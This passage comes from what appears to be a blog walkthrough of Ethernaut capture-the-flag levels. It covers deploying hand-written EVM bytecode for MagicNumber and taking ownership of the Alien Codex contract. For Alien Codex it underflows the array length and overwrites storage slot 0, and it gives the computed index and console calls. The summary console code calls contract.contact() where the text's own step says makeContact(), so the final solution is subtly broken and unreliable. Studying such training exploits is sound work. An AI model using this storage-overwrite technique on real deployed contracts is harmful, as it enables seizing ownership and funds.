The difficulty is that the `solver`'s runtime bytecode must not be greater than 10 opcodes.
To create such a contract, we will need to write raw bytecode directly instead of using a higher-level language compiler.
If you're not familiar with opcodes and the inner workings of the EVM yet, I recommend working through the [Huff docs](https://docs.huff.sh/) first.
In the following, I will assume that you already know those basics.

To start, note that we _don't_ have to code a dedicated `whatIsTheMeaningOfLife()` function for our contract. 
Instead, we can simply have our contract return 42 regardless of the function selector in the calldata.
To do that, we use the following sequence:

- `60 2a`: `PUSH1 0x2a` - Push the value 42 onto the stack.
- `60 00`: `PUSH1 0x00` - Push the memory position 0x00 onto the stack.
- `52`: `MSTORE` - Store the value 42 at memory position 0x00.
- `60 20`: `PUSH1 0x20` - Push the size 32 bytes onto the stack.
- `60 00`: `PUSH1 0x00` - Push the memory position 0x00 onto the stack.
- `f3`: `RETURN` - Return 32 bytes from memory position 0x00.

Note that the `RETURN` opcode requires the return value to be stored in memory instead of just popping it from the stack as other languages do.
Our final runtime bytecode is, therefore, given by `602a60005260206000f3`.

However, to deploy this bytecode to the blockchain, we need to construct initialization code, too!
The purpose of the initialization code is to store the runtime bytecode into the contract's code storage.
Here is a step-by-step breakdown of what the initialization code needs to do:

- `60 0a`: `PUSH1 0x0a` - Push the length of the runtime bytecode onto the stack. The lenth of `602a60005260206000f3` is 10 bytes.
- `60 0c`: `PUSH1 0x0c` - Push the offset where the runtime bytecode is located in the full bytecode. We will see that our final initialization code has a length of 12 bytes, which is why we push 12.
- `60 00`: `PUSH1 0x00` - Push the offset in memory where we want to copy the runtime code.
- `39`: `CODECOPY` - Copy the runtime code to memory.
- `60 0a`: `PUSH1 0x0a` - Push the length of the runtime bytecode onto the stack.
- `60 00`: `PUSH1 0x00` - Push the offset in memory to start copying from.
- `f3`: `RETURN` - Return the runtime code as the contract's code.

Note that this initialization code is indeed 12 bytes long, which is why we used `PUSH1 0x0c` in the second step.

Lastly, we can combine the initialization and runtime bytecodes to get:

```
600a600c600039600a6000f3602a60005260206000f3
```

To deploy the contract via Cast, we can use:

```bash
export PRIVATE_KEY=<your private key>
export RPC_URL=<your rpc url>
export BYTECODE=600a600c600039600a6000f3602a60005260206000f3

cast send --private-key $PRIVATE_KEY --rpc-url $RPC_URL --create $BYTECODE
```

Looking at the transaction receipt, you will see the deployed contract's address, which you can use to call `setSolver()` and complete the level.

# 19. Alien Codex

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

## Solution

The goal of this challenge is to become the owner of the contract.

Before we discuss the solution, I highly recommend reading the section on the [layout of dynamic arrays in storage](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#mappings-and-dynamic-arrays) in the official Solidity docs.

Based on the docs, our level instance has the following storage layout:

| Slot | Data |
|------|------|
| $$0$$ | `bool public contact` and `address private _owner` |
| $$1$$ | `codex.length` |
|...| ... |
| $$keccak256(1)$$ | `codex[0]` |
| $$keccak256(1) + 1$$ | `codex[1]` |
|...| ... |
| $$2^{256} - 1$$ | `codex[2 ** 256 - 1 - uint256(keccak256(abi.encode(1)))]` |
| $$0$$ | `codex[2 ** 256 - 1 - uint256(keccak256(abi.encode(1))) + 1]` |
|...| ... |

Notice that both `contact` as well as `Ownable`'s `_owner` will be packed into slot 0.
We can verify this by executing

```bash
cast storage <your level instance address> 0 --rpc-url $SEP_RPC_URL
```

before and after calling `makeContact()`.

Furthermore, notice that the `revise()` function allows us to override what's stored in slot 0 by writing to the `2 ** 256 - 1 - uint256(keccak256(abi.encode(1))) + 1`th entry of the `codex` array.
However, in order to set a value at this index, we must ensure our `codex` array is large enough for the index `2 ** 256 - 1 - uint256(keccak256(abi.encode(1))) + 1` to exist.
To achieve that, we can use `retract()` to subtract 1 from `codex.length` to underflow the array's length from zero to $$2^{256}-1$$.

As conclusion, we can become the owner of the level instance via the following steps:

1. Call `makeContact()` so that we can pass the `contacted()` modifier.
2. Call `retract()` to increase `codex.length` to $$2^{256}-1$$.
3. Call `revise()` to override slot 0 in a way that makes our player EOA the owner.

Based on the insights mentioned above, we can compute the parameters needed for step 3. via Chisel:

#### `i`
```bash
➜ uint256 i = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;
➜ i
Type: uint256
├ Hex: 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
├ Hex (full word): 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
└ Decimal: 35707666377435648211887908874984608119992236509074197713628505308453184860938
```

#### `_content`

```bash
➜ bytes32(uint256(uint160(<your player address>)))
```

To summarize, we can solve this level in the Ethernaut console via:

```javascript
await contract.contact()

await contract.retract()

await contract.revise("35707666377435648211887908874984608119992236509074197713628505308453184860938", "<your player address cast to bytes32>")
```

18. [MagicNumber](https://www.marcobesier.xyz/blog/ethernaut-solutions/magicnumber)
19. [Alien Codex](https://www.marcobesier.xyz/blog/ethernaut-solutions/alien-codex)
20. [Denial](https://www.marcobesier.xyz/blog/ethernaut-solutions/denial)
21. [Shop](https://www.marcobesier.xyz/blog/ethernaut-solutions/shop)
22. [Dex](https://www.marcobesier.xyz/blog/ethernaut-solutions/dex)
23. [Dex Two](https://www.marcobesier.xyz/blog/ethernaut-solutions/dex-two)
24. [Puzzle Wallet](https://www.marcobesier.xyz/blog/ethernaut-solutions/puzzle-wallet)
25. [Motorbike](https://www.marcobesier.xyz/blog/ethernaut-solutions/motorbike)
26. [DoubleEntryPoint](https://www.marcobesier.xyz/blog/ethernaut-solutions/doubleentrypoint)
27. [Good Samaritan](https://www.marcobesier.xyz/blog/ethernaut-solutions/good-samaritan)
28. [Gatekeeper Three](https://www.marcobesier.xyz/blog/ethernaut-solutions/gatekeeper-three)
29. [Switch](https://www.marcobesier.xyz/blog/ethernaut-solutions/switch)
30. [HigherOrder](https://www.marcobesier.xyz/blog/ethernaut-solutions/higher-order)
31. [Stake](https://www.marcobesier.xyz/blog/ethernaut-solutions/stake)
